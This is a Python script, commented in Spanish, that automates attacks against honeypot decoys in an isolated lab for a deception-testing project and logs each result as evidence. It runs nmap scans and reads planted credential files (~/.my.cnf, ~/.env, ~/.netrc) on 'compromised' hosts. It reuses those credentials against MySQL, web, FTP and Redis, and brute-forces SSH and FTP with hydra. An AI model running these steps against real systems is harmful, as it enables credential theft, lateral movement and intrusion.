"""Batería de ataques reales contra los señuelos; guarda cada salida en docs/evidencias/.

Uso: python ataques.py <repo> web|files
- El "atacante" lee los breadcrumbs desde la víctima (como si la hubiera comprometido) y usa
  sus credenciales (falsas por diseño) desde Kali contra el señuelo.
- Nunca imprime contraseñas del laboratorio: solo las de los breadcrumbs.
"""

import asyncio
import datetime
import re
import sys
from pathlib import Path

import asyncssh

root = Path(sys.argv[1])
grupo = sys.argv[2]
sys.path.insert(0, str(root / "lab"))
from _credenciales import load_lab_hosts  # noqa: E402

hosts = {h.host_id: h for h in load_lab_hosts(root)}
DESTINO = root / "docs" / "evidencias"
CLAVES = "printf '123456\\npassword\\nadmin\\nroot\\ntoor\\n' > /tmp/claves.txt; "


async def run(host_id: str, cmd: str, limite_s: int = 300) -> tuple[str, float]:
    h = hosts[host_id]
    inicio = datetime.datetime.now(datetime.UTC)
    async with asyncssh.connect(
        h.labnet_ip, username=h.user, password=h.password, known_hosts=None
    ) as c:
        r = await c.run(cmd, timeout=limite_s)
    return f"{r.stdout}{r.stderr}", (datetime.datetime.now(datetime.UTC) - inicio).total_seconds()


async def ataque(
    nombre: str, descripcion: str, host_id: str, cmd: str, mostrar: str | None = None
) -> str:
    inicio = datetime.datetime.now(datetime.UTC)
    salida, dur = await run(host_id, cmd)
    donde = "kali (10.0.0.20)" if host_id == "kali-lab" else f"{host_id} (comprometida)"
    texto = (
        f"# {inicio:%Y-%m-%d %H:%M:%S} UTC · {dur:.0f} s · desde {donde}\n"
        f"# {descripcion}\n$ {mostrar or cmd}\n\n{salida}"
    )
    (DESTINO / f"{nombre}.txt").write_text(texto, encoding="utf-8")
    print(texto)
    return salida


def campo(texto: str, clave: str) -> str:
    m = re.search(rf"^{clave}\s*=\s*(\S+)", texto, re.M)
    if not m:
        raise SystemExit(f"no encuentro {clave} en el breadcrumb")
    return m.group(1)


async def web() -> None:
    if "recon" not in sys.argv[3:]:
        await ataque(
            "20-ataque-nmap-recon",
            "Reconocimiento: escaneo de versiones y SO del host real y del señuelo",
            "kali-lab",
            "sudo -n nmap -sV -O -p 21,22,80,3306,6379 10.0.0.10 10.0.0.50",
        )
    await run("kali-lab", "sudo -n pkill -x nmap; true")
    await ataque(
        "21-ataque-barrido-puertos",
        "Barrido de los 1000 puertos TCP más comunes del señuelo",
        "kali-lab",
        "sudo -n nmap -sS --top-ports 1000 -T4 --max-retries 1 10.0.0.50",
    )
    migas = await ataque(
        "22-ataque-lectura-breadcrumbs",
        "El atacante, ya dentro de victima-01, busca credenciales en el home",
        "victima-01",
        "ls -la ~; echo; echo '--- ~/.my.cnf'; cat ~/.my.cnf; echo '--- ~/.env'; cat ~/.env",
    )
    mycnf = migas.split("--- ~/.my.cnf")[1].split("--- ~/.env")[0]
    env = migas.split("--- ~/.env")[1]
    usuario, clave = campo(mycnf, "user"), campo(mycnf, "password")
    await ataque(
        "23-ataque-mysql-breadcrumb",
        "Movimiento lateral: credencial de ~/.my.cnf contra el MySQL del señuelo",
        "kali-lab",
        f"mysql -h 10.0.0.50 -u {usuario} -p{clave} --skip-ssl --connect-timeout=5 "
        "-e 'show databases'",
    )
    iu, ip_ = campo(env, "INTRANET_USER"), campo(env, "INTRANET_PASSWORD")
    await ataque(
        "24-ataque-http-breadcrumb",
        "Movimiento lateral: credencial de la intranet (~/.env) en el login web del señuelo",
        "kali-lab",
        f"curl -s -o /dev/null -w 'HTTP %{{http_code}}\\n' -d 'username={iu}&password={ip_}' http://10.0.0.50/index.html",
    )
    await ataque(
        "25-ataque-hydra-ssh",
        "Fuerza bruta SSH contra el señuelo (5 contraseñas)",
        "kali-lab",
        CLAVES + "hydra -l root -P /tmp/claves.txt -t 2 -I ssh://10.0.0.50",
        "hydra -l root -P /tmp/claves.txt -t 2 -I ssh://10.0.0.50",
    )
    await ataque(
        "26-ataque-whatweb",
        "Huella web del host real frente al señuelo",
        "kali-lab",
        "whatweb --color=never -a 1 http://10.0.0.10/ http://10.0.0.50/",
    )


async def files() -> None:
    migas = await ataque(
        "30-ataque-lectura-breadcrumbs-02",
        "El atacante, ya dentro de victima-02, busca credenciales en el home",
        "victima-02",
        "ls -la ~; echo; echo '--- ~/.netrc'; cat ~/.netrc; echo '--- ~/.env'; cat ~/.env",
    )
    netrc = migas.split("--- ~/.netrc")[1].split("--- ~/.env")[0]
    env = migas.split("--- ~/.env")[1]
    fu = re.search(r"login\s+(\S+)", netrc).group(1)
    fp = re.search(r"password\s+(\S+)", netrc).group(1)
    if "solo-redis" not in sys.argv[3:]:
        await ataque(
            "31-ataque-ftp-breadcrumb",
            "Movimiento lateral: credencial de ~/.netrc contra el FTP del señuelo",
            "kali-lab",
            f'curl -s --max-time 10 --user {fu}:{fp} ftp://10.0.0.51/; echo "curl: código $?"',
        )
    if "solo-redis" in sys.argv[3:]:
        pass
    m = re.search(r"redis://([^:@/\s]*):([^@/\s]+)@", env)
    if m:
        rp = m.group(2)
        await ataque(
            "32-ataque-redis-breadcrumb",
            "Movimiento lateral: contraseña de REDIS_URL (~/.env) contra el Redis del señuelo",
            "kali-lab",
            f"redis-cli -h 10.0.0.51 AUTH {rp}",
        )
    if "solo-redis" in sys.argv[3:]:
        return
    await ataque(
        "33-ataque-hydra-ftp",
        "Fuerza bruta FTP contra el señuelo (5 contraseñas)",
        "kali-lab",
        CLAVES + "hydra -l admin -P /tmp/claves.txt -t 2 -I ftp://10.0.0.51",
        "hydra -l admin -P /tmp/claves.txt -t 2 -I ftp://10.0.0.51",
    )


asyncio.run(web() if grupo == "web" else files())
